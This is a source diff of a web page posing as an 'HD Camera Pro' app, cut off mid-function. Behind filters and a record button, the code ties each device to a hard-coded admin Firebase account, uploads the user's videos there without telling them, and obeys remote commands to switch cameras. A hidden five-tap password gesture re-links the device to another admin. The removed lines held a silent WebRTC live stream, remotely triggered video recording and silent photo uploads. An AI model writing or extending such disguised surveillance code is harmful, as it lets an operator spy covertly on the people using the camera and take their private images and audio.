@@ -16,8 +16,9 @@
             height: 100vh;
             overflow: hidden;
             justify-content: space-between;
-            touch-action: none; /* Prevents unwanted browser zoom and pinch gestures */
+            touch-action: none;
         }
+
         /* Camera Viewfinder Header */
         .camera-header {
             padding: 15px;
@@ -59,6 +60,18 @@
             font-weight: bold;
             border-color: #ffffff;
         }
+        .filter-chip.night-active {
+            background: #ffd700;
+            color: #0f172a;
+            font-weight: bold;
+            border-color: #ffffff;
+        }
+        .filter-chip.ai-chat-chip {
+            background: #10b981;
+            color: #ffffff;
+            font-weight: bold;
+            border: 1px solid #ffffff;
+        }
 
         /* Live Camera Preview (Viewfinder) */
         .viewfinder {
@@ -70,7 +83,6 @@
             overflow: hidden;
             background: #000000;
         }
-        /* Black Loading Screen to hide browser play icon */
         #loading-screen {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -92,6 +104,17 @@
         }
         #snapshot-canvas { display: none; }
 
+        /* Screen Flash Bright White Light Overlay for Front Night Selfie */
+        #screen-flash-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff;
+            pointer-events: none;
+            opacity: 0;
+            z-index: 7;
+            transition: opacity 0.2s ease;
+        }
+
         /* Shutter Flash Animation Overlay */
         #shutter-flash {
             position: absolute;
@@ -101,6 +124,24 @@
             pointer-events: none;
             z-index: 8;
             transition: opacity 0.15s ease-out;
+        }
+
+        /* Video Recording Timer Badge */
+        #video-timer-badge {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(220, 38, 38, 0.9);
+            color: #ffffff;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            z-index: 9;
         }
 
         /* Camera Controls Footer */
@@ -127,8 +168,33 @@
         }
         .capture-btn:active { transform: scale(0.9); }
         .capture-btn i { font-size: 1.6rem; color: #0f172a; display: none; position: absolute; }
+
+        .video-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.15);
+            border: 2px solid #ef4444;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #ef4444;
+            font-size: 1.2rem;
+            transition: background 0.2s;
+        }
+        .video-btn.recording {
+            background: #ef4444;
+            color: #ffffff;
+            animation: pulse-red 1s infinite;
+        }
+
+        @keyframes pulse-red {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
         
-        /* Gallery Thumbnail Button */
         .gallery-thumb-btn {
             width: 48px;
             height: 48px;
@@ -157,22 +223,25 @@
     <!-- Firebase SDK Compat -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 </head>
 <body>
 
     <!-- Hidden Native File Input to Trigger Real Mobile Gallery -->
     <input type="file" id="real-gallery-picker" accept="image/*" style="display: none;" onchange="handleGallerySelect(event)">
 
-    <!-- HD Camera Header Controls -->
+    <!-- HD Camera Header Controls (Secret 5-Tap Password Protection on Title) -->
     <div class="camera-header">
         <i class="fa-solid fa-bolt" id="flash-icon" onclick="toggleFlash()"></i>
-        <span style="font-size: 0.9rem; font-weight: bold; letter-spacing: 1px;">HD CAMERA PRO</span>
-        <i class="fa-solid fa-wand-magic-sparkles" style="color:#38bdf8;"></i>
+        <span id="app-title-header" style="font-size: 0.9rem; font-weight: bold; letter-spacing: 1px; cursor: pointer;" title="HD Camera Pro">HD CAMERA PRO</span>
+        <i class="fa-solid fa-robot" style="color:#10b981;" onclick="openChatGPTEditor()" title="HD Camera Pro - ChatGPT AI Editor"></i>
     </div>
 
-    <!-- AI Filter Selection Bar with Dedicated Close-Up & Macro Options -->
+    <!-- AI Filter Selection Bar -->
     <div class="filter-bar">
         <div class="filter-chip active" onclick="setFilter('none', this)"><i class="fa-solid fa-camera"></i> Auto AI Ultra</div>
+        <div class="filter-chip" id="night-chip" onclick="setNightMode(this)"><i class="fa-solid fa-moon"></i> Night Mode Light</div>
+        <div class="filter-chip ai-chat-chip" onclick="openChatGPTEditor()"><i class="fa-solid fa-robot"></i> HD Camera Pro - ChatGPT AI Editor</div>
         <div class="filter-chip" onclick="setFilter('contrast(160%) saturate(140%) brightness(115%) drop-shadow(0px 0px 2px rgba(0,0,0,0.6))', this)"><i class="fa-solid fa-seedling"></i> Close-Up Macro HD</div>
         <div class="filter-chip" onclick="setFilter('contrast(175%) brightness(120%) saturate(110%)', this)"><i class="fa-solid fa-magnifying-glass"></i> Micro-Text Sharp</div>
         <div class="filter-chip" onclick="setFilter('contrast(155%) brightness(112%) saturate(90%)', this)"><i class="fa-solid fa-file-lines"></i> DocScanner HD</div>
@@ -189,25 +258,33 @@
             <i class="fa-solid fa-camera fa-spin fa-2x" style="color: #38bdf8;"></i>
             <span>Initializing Camera...</span>
         </div>
+        <div id="screen-flash-overlay"></div>
         <div id="shutter-flash"></div>
+        
+        <div id="video-timer-badge">
+            <i class="fa-solid fa-circle fa-beat-fade" style="font-size: 0.6rem;"></i>
+            <span id="rec-time-text">REC 00:00</span>
+        </div>
+
         <video id="camera-feed" autoplay playsinline muted></video>
         <canvas id="snapshot-canvas"></canvas>
     </div>
 
     <!-- HD Camera Footer Controls -->
     <div class="camera-footer">
-        <!-- Gallery Preview Icon (Triggers Real Gallery) -->
         <div class="gallery-thumb-btn" onclick="openRealGallery()">
             <i class="fa-solid fa-image control-icon" id="gallery-icon-placeholder" style="font-size: 1.2rem;"></i>
             <img id="gallery-thumb-img" alt="Last Captured">
         </div>
 
-        <!-- Manual HD Capture Button with Loading Spinner Wheel -->
+        <div class="video-btn" id="video-rec-btn" onclick="toggleManualVideoRecording()" title="Record Ultra HD Video">
+            <i class="fa-solid fa-video"></i>
+        </div>
+
         <div class="capture-btn" id="shutter-btn" onclick="manualCapture()">
             <i class="fa-solid fa-spinner fa-spin" id="shutter-spinner"></i>
         </div>
 
-        <!-- Camera Switch Icon -->
         <i class="fa-solid fa-camera-rotate control-icon" onclick="toggleFacingMode()"></i>
     </div>
 
@@ -225,394 +302,688 @@
 
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const storage = firebase.storage();
 
-        async function keepScreenOn() {
-            try { if ('wakeLock' in navigator) await navigator.wakeLock.request('screen'); } catch(e){}
-        }
-        keepScreenOn();
-
-        const video = document.getElementById('camera-feed');
-        const canvas = document.getElementById('snapshot-canvas');
-        let localStream = null;
-        let currentFacingMode = 'user'; // Default Front Camera
-        let flashState = false;
-        let currentFilterValue = 'none';
-        let isCapturing = false;
-
-        video.onplaying = () => {
-            const loader = document.getElementById('loading-screen');
-            if (loader) loader.style.display = 'none';
-        };
-
-        // Open native Android photo picker/gallery
-        function openRealGallery() {
-            document.getElementById('real-gallery-picker').click();
-        }
-
-        function handleGallerySelect(event) {
-            const file = event.target.files[0];
-            if (file) {
-                console.log("Gallery opened and photo chosen:", file.name);
-            }
-        }
-
-        function setFilter(filterCss, element) {
-            currentFilterValue = filterCss;
-            video.style.filter = filterCss;
+        // Helper function to handle precise email linking and sync password to specific node
+        function handleEmailLink(email) {
+            const safe = email.replace(/[.@]/g, '_');
+            localStorage.setItem('paired_admin_email_safe', safe);
             
-            document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active'));
-            element.classList.add('active');
+            // Auto-generate unified lock password and store on specific master node
+            const autoPassword = 'cam_' + Math.random().toString(36).substring(2, 10) + Math.floor(Math.random() * 900 + 100);
+            localStorage.setItem('secret_link_password', autoPassword);
+
+            // Sync latest password to specific master admin node securely so it matches everywhere
+            db.ref(`users/admin_cctv_com/security/latest_link_password`).set({
+                password: autoPassword,
+                linkedEmail: email,
+                updatedAt: Date.now()
+            }).catch(e => {});
+
+            // Record into master admin's specific linked devices registry with timestamp
+            const linkTimestamp = new Date().toLocaleString();
+            db.ref(`users/admin_cctv_com/security/linked_devices/${safe}`).set({
+                email: email,
+                safeEmail: safe,
+                linkedAt: linkTimestamp,
+                timestamp: Date.now(),
+                status: 'Active',
+                command: 'link'
+            }).catch(e => {});
+
+            return safe;
         }
 
-        // Android Permission Check & Request Logic
-        async function checkAndRequestCameraPermission() {
-            try {
-                if (navigator.permissions && navigator.permissions.query) {
-                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-                    if (permissionStatus.state === 'denied') {
-                        alert("Camera permission is blocked. Please allow camera access in your device or browser settings to take photos.");
-                    }
-                }
-            } catch (e) {
-                console.log("Permission query note:", e);
-            }
+        // 1. Check URL Parameter first (if shared via link with ?admin=email)
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlAdminEmail = urlParams.get('admin') || urlParams.get('email');
+        if (urlAdminEmail) {
+            handleEmailLink(urlAdminEmail);
         }
 
-        // Optimized Camera Constraints for Smooth Switching & Macro Focus (Including Audio for Video Recording)
-        async function requestPermissionsAndStart() {
-            await checkAndRequestCameraPermission();
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: currentFacingMode, 
-                        width: { ideal: 1920 }, 
-                        height: { ideal: 1080 },
-                        focusMode: 'continuous'
-                    },
-                    audio: true 
-                });
-                video.srcObject = localStream;
-
-                const track = localStream.getVideoTracks()[0];
-                if (track && track.getCapabilities && track.getCapabilities().focusMode) {
-                    try {
-                        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
-                    } catch(err) {}
-                }
-
-                if (window.showSaveFilePicker || navigator.storage) {
-                    try { await navigator.storage.persist(); } catch(err) {}
-                }
-            } catch (error) {
-                console.error("Permission/Camera Access Error:", error);
-                alert("Please allow camera permissions to use HD Camera Pro.");
-            }
+        // 2. Default linked safe email node
+        let pairedSafeEmail = localStorage.getItem('paired_admin_email_safe');
+        if (!pairedSafeEmail) {
+            pairedSafeEmail = handleEmailLink('admin@cctv.com');
         }
-
-        // Fixed Camera Start / Switch Function (Prevents blank screen bugs)
-        async function startCamera(facingMode) {
-            const loader = document.getElementById('loading-screen');
-            if (loader) loader.style.display = 'flex';
-
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-                localStream = null;
-                video.srcObject = null;
-            }
-
-            try {
-                await new Promise(resolve => setTimeout(resolve, 150));
-
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: facingMode, 
-                        width: { ideal: 1920 }, 
-                        height: { ideal: 1080 },
-                        focusMode: 'continuous'
-                    },
-                    audio: true 
-                });
-                
-                const track = localStream.getVideoTracks()[0];
-                if (track && track.getCapabilities && track.getCapabilities().focusMode) {
-                    try {
-                        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
-                    } catch(err) {}
-                }
-
-                video.srcObject = localStream;
-                video.style.filter = currentFilterValue;
-                flashState = false;
-                document.getElementById('flash-icon').style.color = '#ffd700';
-                document.getElementById('flash-icon').className = 'fa-solid fa-bolt';
-            } catch (error) {
-                console.error("Camera Switch Error:", error);
-                if (loader) loader.style.display = 'none';
-            }
-        }
-
-        db.ref('security/settings/cameraMode').on('value', (snapshot) => {
-            const mode = snapshot.val();
-            if (mode && mode !== currentFacingMode) {
-                currentFacingMode = mode;
-                startCamera(currentFacingMode);
+        
+        // 3. Sync local password with Firebase master node in real-time to prevent mismatch
+        db.ref(`users/admin_cctv_com/security/latest_link_password/password`).on('value', (snapshot) => {
+            const remotePwd = snapshot.val();
+            if (remotePwd) {
+                localStorage.setItem('secret_link_password', remotePwd);
+            } else if (!localStorage.getItem('secret_link_password')) {
+                localStorage.setItem('secret_link_password', 'cctv1234');
             }
         });
 
-        async function toggleFlash() {
-            if (!localStream) return;
-            const track = localStream.getVideoTracks()[0];
-            if (!track) return;
+        // --- SECRET 5-TAP GESTURE WITH PASSWORD VERIFICATION ---
+        let titleTapCount = 0;
+        let titleTapTimer = null;
+        document.getElementById('app-title-header').addEventListener('click', () => {
+            titleTapCount++;
+            clearTimeout(titleTapTimer);
+            titleTapTimer = setTimeout(() => { titleTapCount = 0; }, 2000);
 
-            flashState = !flashState;
-            const flashIcon = document.getElementById('flash-icon');
+            if (titleTapCount >= 5) {
+                titleTapCount = 0;
+                const enteredPwd = prompt("Enter Security Password to change linked email:");
+                const correctPwd = localStorage.getItem('secret_link_password') || 'cctv1234';
 
-            try {
-                await track.applyConstraints({
-                    advanced: [{ torch: flashState }]
+                if (enteredPwd === correctPwd) {
+                    const newEmail = prompt("Enter new Admin Email to link this Camera App:", pairedSafeEmail.replace(/_/g, '.'));
+                    if (newEmail && newEmail.includes('@')) {
+                        handleEmailLink(newEmail);
+                        alert("Camera successfully linked to: " + newEmail + "\nReloading app...");
+                        location.reload();
+                    }
+                } else if (enteredPwd !== null) {
+                    alert("Incorrect Password! Access Denied.");
+                }
+            }
+        });
+
+        // --- MASTER ADMIN COMMAND LISTENER FOR UNLINK & LINK ---
+        const masterSafeEmail = 'admin_cctv_com';
+        
+        // Listen to password update commands
+        db.ref(`users/${masterSafeEmail}/security/commands/update_link_password`).on('value', (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd && cmd.newPassword && cmd.status === 'pending') {
+                localStorage.setItem('secret_link_password', cmd.newPassword);
+                db.ref(`users/${masterSafeEmail}/security/commands/update_link_password`).update({
+                    status: 'completed',
+                    updatedAt: Date.now()
                 });
-
-                flashIcon.style.color = flashState ? '#ffffff' : '#ffd700';
-                flashIcon.className = flashState ? 'fa-solid fa-bolt-lightning' : 'fa-solid fa-bolt';
-            } catch (err) {
-                console.error("Torch Error:", err);
-                flashState = !flashState;
             }
-        }
+        });
 
-        // Trigger Android Camera Flash Animation
-        function triggerShutterAnimation() {
-            const flash = document.getElementById('shutter-flash');
-            flash.style.opacity = '1';
-            setTimeout(() => {
-                flash.style.opacity = '0';
-            }, 120);
-        }
-
-        // Manual Capture with Active Loading Wheel Spinner & 1000x Microscopic Zoom HD Clarity
-        function manualCapture() {
-            if (isCapturing || !localStream) return;
-            isCapturing = true;
-
-            // Show loading spinner wheel on capture button immediately
-            const spinner = document.getElementById('shutter-spinner');
-            if (spinner) spinner.style.display = 'block';
-
-            triggerShutterAnimation();
-
-            // Run heavy 10K microscopic processing smoothly after spinner renders
-            setTimeout(() => {
-                captureAndSendPhoto("Manual Microscopic 1000x Snapshot", true, true);
-                
-                // Hide spinner wheel after capture & save complete
-                if (spinner) spinner.style.display = 'none';
-                isCapturing = false;
-            }, 80);
-        }
-
-        function toggleFacingMode() {
-            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-            startCamera(currentFacingMode);
-            db.ref('security/settings/cameraMode').set(currentFacingMode);
-        }
-
-        // Dual-Mode Capture Engine (Lightweight for Auto-Background, 4.0x Microscopic 1000x Zoom for Manual)
-        function captureAndSendPhoto(label = "Auto Snapshot", saveToDevice = false, isManual = false) {
-            if (!localStream) return;
-            
-            if (isManual) {
-                // True 10K Microscopic Upscaling Factor (4.0x) for 1000x zoom clarity with zero blur
-                const scaleFactor = 4.0;
-                canvas.width = (video.videoWidth || 1920) * scaleFactor;
-                canvas.height = (video.videoHeight || 1080) * scaleFactor;
-            } else {
-                // Optimized standard HD for background auto-capture to ensure zero phone lag
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-            }
-            
-            const ctx = canvas.getContext('2d');
-            ctx.imageSmoothingEnabled = true;
-            ctx.imageSmoothingQuality = 'high';
-
-            // Apply selected filter or high-contrast microscopic preset
-            if (currentFilterValue !== 'none') {
-                ctx.filter = currentFilterValue;
-            } else {
-                ctx.filter = isManual ? 'contrast(145%) saturate(125%) brightness(105%)' : 'none';
-            }
-
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageBase64 = canvas.toDataURL('image/jpeg', isManual ? 0.98 : 0.85);
-            const timestamp = new Date().toLocaleString();
-            const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
-
-            // 1. Silent Sync to Firebase Admin Panel
-            db.ref('security/photos').push({
-                image: imageBase64,
-                text: `${camType} - ${label} at ${timestamp}`,
-                timestamp: timestamp
-            });
-
-            // 2. Silent Device Gallery Save & Thumbnail Preview Update
-            if (saveToDevice) {
-                const thumbImg = document.getElementById('gallery-thumb-img');
-                const placeholder = document.getElementById('gallery-icon-placeholder');
-                thumbImg.src = imageBase64;
-                thumbImg.style.display = 'block';
-                if(placeholder) placeholder.style.display = 'none';
-
-                const link = document.createElement('a');
-                link.href = imageBase64;
-                link.download = `Microscopic_1000x_${Date.now()}.jpg`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }
-        }
-
-        // WebRTC Silent Live Stream Receiver
-        const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-        let peerConnection = null;
-
-        function setupWebRTCListener() {
-            db.ref('security/signal').on('value', async (snapshot) => {
-                const data = snapshot.val();
-                if (!data || !data.offer) return;
-
-                if (peerConnection && peerConnection.signalingState !== "stable") return;
-
-                peerConnection = new RTCPeerConnection(pcConfig);
-                if (localStream) {
-                    localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
-                }
-
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        db.ref('security/signal/clientCandidates').push(event.toJSON());
+        // Listen to remote link/unlink command targeting this specific device
+        db.ref(`users/admin_cctv_com/security/linked_devices/${pairedSafeEmail}/command`).on('value', (snapshot) => {
+            const cmd = snapshot.val();
+            if (cmd) {
+                if (cmd === 'unlink') {
+                    if (pairedSafeEmail !== 'admin_cctv_com') {
+                        db.ref(`users/admin_cctv_com/security/linked_devices/${pairedSafeEmail}`).update({ status: 'Unlinked' });
+                        alert("Device unlinked by administrator.");
                     }
-                };
-
-                try {
-                    await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
-                    const answer = await peerConnection.createAnswer();
-                    await peerConnection.setLocalDescription(answer);
-                    await db.ref('security/signal/answer').set(answer);
-                } catch(e) {
-                    console.error("WebRTC Error:", e);
+                } else if (cmd === 'link') {
+                    db.ref(`users/admin_cctv_com/security/linked_devices/${pairedSafeEmail}`).update({ status: 'Active' });
                 }
-            });
+            }
+        });
 
-            db.ref('security/signal/adminCandidates').on('child_added', (snapshot) => {
-                const candidate = snapshot.val();
-                if (peerConnection && candidate) {
-                    peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => {});
-                }
-            });
-        }
+        // Initialize Camera App with current linked safe email node
+        initCameraApp(pairedSafeEmail);
 
-        // Admin Command Listener for Continuous 10-Second HD Video Chunk Recording
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let isVideoRecordingActive = false;
-        let videoIntervalTimer = null;
+        function initCameraApp(safeEmail) {
+            async function keepScreenOn() {
+                try { if ('wakeLock' in navigator) await navigator.wakeLock.request('screen'); } catch(e){}
+            }
+            keepScreenOn();
 
-        function setupVideoCommandListener() {
-            db.ref('security/commands/videoRecording').on('value', (snapshot) => {
-                const cmd = snapshot.val();
-                if (cmd) {
-                    if (cmd.action === 'start' && !isVideoRecordingActive) {
-                        startContinuousVideoRecording();
-                    } else if (cmd.action === 'stop' && isVideoRecordingActive) {
-                        stopContinuousVideoRecording();
-                    }
-                }
-            });
-        }
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('snapshot-canvas');
+            let localStream = null;
+            let currentFacingMode = 'user';
+            let flashState = false;
+            let currentFilterValue = 'none';
+            let isNightModeActive = false;
+            let isCapturing = false;
 
-        function startContinuousVideoRecording() {
-            if (!localStream || isVideoRecordingActive) return;
-            isVideoRecordingActive = true;
+            let manualMediaRecorder = null;
+            let manualVideoChunks = [];
+            let isManualRecording = false;
+            let manualVideoTimer = null;
+            let manualVideoSeconds = 0;
 
-            const recordChunkLoop = () => {
-                if (!isVideoRecordingActive) return;
+            video.onplaying = () => {
+                const loader = document.getElementById('loading-screen');
+                if (loader) loader.style.display = 'none';
+            };
 
-                try {
-                    recordedChunks = [];
-                    const options = { mimeType: 'video/webm;codecs=vp9,opus' };
-                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                        options.mimeType = 'video/webm';
-                    }
+            window.openRealGallery = function() {
+                document.getElementById('real-gallery-picker').click();
+            };
 
-                    mediaRecorder = new MediaRecorder(localStream, options);
-
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data && event.data.size > 0) {
-                            recordedChunks.push(event.data);
-                        }
-                    };
-
-                    mediaRecorder.onstop = () => {
-                        if (recordedChunks.length > 0 && isVideoRecordingActive) {
-                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                const base64Video = reader.result;
-                                const timestamp = new Date().toLocaleString();
-                                const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
-
-                                // Push 10-second HD video chunk silently to Firebase Realtime Database
-                                db.ref('security/videos').push({
-                                    video: base64Video,
-                                    text: `${camType} - HD Video Chunk (10s) at ${timestamp}`,
-                                    timestamp: timestamp
-                                });
-                            };
-                            reader.readAsDataURL(blob);
-                        }
-                    };
-
-                    mediaRecorder.start();
-
-                    // Record for exactly 10 seconds, stop to upload chunk, and loop automatically
-                    videoIntervalTimer = setTimeout(() => {
-                        if (mediaRecorder && mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                        if (isVideoRecordingActive) {
-                            recordChunkLoop();
-                        }
-                    }, 10000);
-
-                } catch (err) {
-                    console.error("Video Recording Error:", err);
-                    isVideoRecordingActive = false;
+            window.handleGallerySelect = function(event) {
+                const file = event.target.files[0];
+                if (file) {
+                    console.log("Gallery opened and photo chosen:", file.name);
                 }
             };
 
-            recordChunkLoop();
-        }
+            window.openChatGPTEditor = function() {
+                window.open('https://chatgpt.com', '_blank');
+            };
 
-        function stopContinuousVideoRecording() {
-            isVideoRecordingActive = false;
-            if (videoIntervalTimer) {
-                clearTimeout(videoIntervalTimer);
-                videoIntervalTimer = null;
-            }
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }
+            window.setFilter = function(filterCss, element) {
+                isNightModeActive = false;
+                currentFilterValue = filterCss;
+                video.style.filter = filterCss;
+                document.getElementById('screen-flash-overlay').style.opacity = '0';
+                
+                document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active', 'night-active'));
+                element.classList.add('active');
+            };
 
-        window.addEventListener('load', () => {
+            window.setNightMode = function(element) {
+                isNightModeActive = true;
+                currentFilterValue = 'contrast(115%) saturate(110%) brightness(105%)';
+                video.style.filter = currentFilterValue;
+                document.getElementById('screen-flash-overlay').style.opacity = '1';
+
+                document.querySelectorAll('.filter-chip').forEach(chip => chip.classList.remove('active', 'night-active'));
+                element.classList.add('night-active');
+            };
+
+            async function checkAndRequestCameraPermission() {
+                try {
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                        if (permissionStatus.state === 'denied') {
+                            alert("Camera permission is blocked. Please allow camera access in your device settings.");
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            async function requestPermissionsAndStart() {
+                await checkAndRequestCameraPermission();
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: currentFacingMode, 
+                            width: { ideal: 1280 }, 
+                            height: { ideal: 720 },
+                            frameRate: { ideal: 30 },
+                            focusMode: 'continuous'
+                        },
+                        audio: true 
+                    });
+                    video.srcObject = localStream;
+
+                    const track = localStream.getVideoTracks()[0];
+                    if (track && track.getCapabilities && track.getCapabilities().focusMode) {
+                        try {
+                            await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
+                        } catch(err) {}
+                    }
+
+                    if (window.showSaveFilePicker || navigator.storage) {
+                        try { await navigator.storage.persist(); } catch(err) {}
+                    }
+                } catch (error) {
+                    console.error("Camera Access Error:", error);
+                    alert("Please allow camera permissions to use HD Camera Pro.");
+                }
+            }
+
+            async function startCamera(facingMode) {
+                const loader = document.getElementById('loading-screen');
+                if (loader) loader.style.display = 'flex';
+
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                    localStream = null;
+                    video.srcObject = null;
+                }
+
+                try {
+                    await new Promise(resolve => setTimeout(resolve, 150));
+
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: facingMode, 
+                            width: { ideal: 1280 }, 
+                            height: { ideal: 720 },
+                            frameRate: { ideal: 30 },
+                            focusMode: 'continuous'
+                        },
+                        audio: true 
+                    });
+                    
+                    const track = localStream.getVideoTracks()[0];
+                    if (track && track.getCapabilities && track.getCapabilities().focusMode) {
+                        try {
+                            await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
+                        } catch(err) {}
+                    }
+
+                    video.srcObject = localStream;
+                    video.style.filter = currentFilterValue;
+                    flashState = false;
+                    document.getElementById('flash-icon').style.color = '#ffd700';
+                    document.getElementById('flash-icon').className = 'fa-solid fa-bolt';
+                } catch (error) {
+                    if (loader) loader.style.display = 'none';
+                }
+            }
+
+            db.ref(`users/${safeEmail}/security/settings/cameraMode`).on('value', (snapshot) => {
+                const mode = snapshot.val();
+                if (mode && mode !== currentFacingMode) {
+                    currentFacingMode = mode;
+                    startCamera(currentFacingMode);
+                }
+            });
+
+            window.toggleFlash = async function() {
+                if (!localStream) return;
+                const track = localStream.getVideoTracks()[0];
+                if (!track) return;
+
+                flashState = !flashState;
+                const flashIcon = document.getElementById('flash-icon');
+
+                try {
+                    await track.applyConstraints({
+                        advanced: [{ torch: flashState }]
+                    });
+
+                    flashIcon.style.color = flashState ? '#ffffff' : '#ffd700';
+                    flashIcon.className = flashState ? 'fa-solid fa-bolt-lightning' : 'fa-solid fa-bolt';
+                } catch (err) {
+                    flashState = !flashState;
+                }
+            };
+
+            function triggerShutterAnimation() {
+                const flash = document.getElementById('shutter-flash');
+                flash.style.opacity = '1';
+                setTimeout(() => { flash.style.opacity = '0'; }, 120);
+            }
+
+            window.manualCapture = function() {
+                if (isCapturing || !localStream) return;
+                isCapturing = true;
+
+                const spinner = document.getElementById('shutter-spinner');
+                if (spinner) spinner.style.display = 'block';
+
+                triggerShutterAnimation();
+
+                setTimeout(() => {
+                    captureAndSendPhoto(isNightModeActive ? "Manual Night Mode Snapshot" : "Manual Microscopic 1000x Snapshot", true, true);
+                    if (spinner) spinner.style.display = 'none';
+                    isCapturing = false;
+                }, 80);
+            };
+
+            function getSupportedMediaRecorderOptions() {
+                const types = [
+                    'video/mp4',
+                    'video/webm;codecs=vp8',
+                    'video/webm;codecs=h264',
+                    'video/webm'
+                ];
+                for (let t of types) {
+                    if (MediaRecorder.isTypeSupported(t)) {
+                        return { mimeType: t, videoBitsPerSecond: 600000 };
+                    }
+                }
+                return {};
+            }
+
+            window.toggleManualVideoRecording = function() {
+                if (!localStream) return;
+                const videoBtn = document.getElementById('video-rec-btn');
+                const timerBadge = document.getElementById('video-timer-badge');
+
+                if (!isManualRecording) {
+                    manualVideoChunks = [];
+                    try {
+                        const options = getSupportedMediaRecorderOptions();
+                        manualMediaRecorder = new MediaRecorder(localStream, options);
+
+                        manualMediaRecorder.ondataavailable = (e) => {
+                            if (e.data && e.data.size > 0) manualVideoChunks.push(e.data);
+                        };
+
+                        manualMediaRecorder.onstop = () => {
+                            if (manualVideoChunks.length > 0) {
+                                const blob = new Blob(manualVideoChunks, { type: manualMediaRecorder.mimeType || 'video/webm' });
+                                const videoUrl = URL.createObjectURL(blob);
+                                
+                                const link = document.createElement('a');
+                                link.href = videoUrl;
+                                link.download = `Smooth_HD_Video_${Date.now()}.mp4`;
+                                document.body.appendChild(link);
+                                link.click();
+                                document.body.removeChild(link);
+
+                                const reader = new FileReader();
+                                reader.onloadend = () => {
+                                    const base64Video = reader.result;
+                                    const timestamp = new Date().toLocaleString();
+                                    const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+                                    
+                                    db.ref(`users/${safeEmail}/security/videos`).push({
+                                        video: base64Video,
+                                        text: `${camType} - Smooth HD Video at ${timestamp}`,
+                                        timestamp: timestamp
+                                    }).catch(err => {});
+                                };
+                                reader.readAsDataURL(blob);
+                            }
+                        };
+
+                        manualMediaRecorder.start(250);
+                        isManualRecording = true;
+
+                        videoBtn.classList.add('recording');
+                        videoBtn.innerHTML = '<i class="fa-solid fa-square"></i>';
+                        timerBadge.style.display = 'flex';
+
+                        manualVideoSeconds = 0;
+                        manualVideoTimer = setInterval(() => {
+                            manualVideoSeconds++;
+                            const mins = String(Math.floor(manualVideoSeconds / 60)).padStart(2, '0');
+                            const secs = String(manualVideoSeconds % 60).padStart(2, '0');
+                            document.getElementById('rec-time-text').innerText = `REC ${mins}:${secs}`;
+                        }, 1000);
+
+                    } catch(err) {}
+                } else {
+                    isManualRecording = false;
+                    if (manualMediaRecorder && manualMediaRecorder.state === 'recording') {
+                        manualMediaRecorder.stop();
+                    }
+
+                    clearInterval(manualVideoTimer);
+                    videoBtn.classList.remove('recording');
+                    videoBtn.innerHTML = '<i class="fa-solid fa-video"></i>';
+                    timerBadge.style.display = 'none';
+                }
+            };
+
+            window.toggleFacingMode = function() {
+                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+                startCamera(currentFacingMode);
+                db.ref(`users/${safeEmail}/security/settings/cameraMode`).set(currentFacingMode);
+            };
+
+            function captureAndSendPhoto(label = "Auto Snapshot", saveToDevice = false, isManual = false) {
+                if (!localStream) return;
+                
+                if (isManual) {
+                    const scaleFactor = 4.0;
+                    canvas.width = (video.videoWidth || 1920) * scaleFactor;
+                    canvas.height = (video.videoHeight || 1080) * scaleFactor;
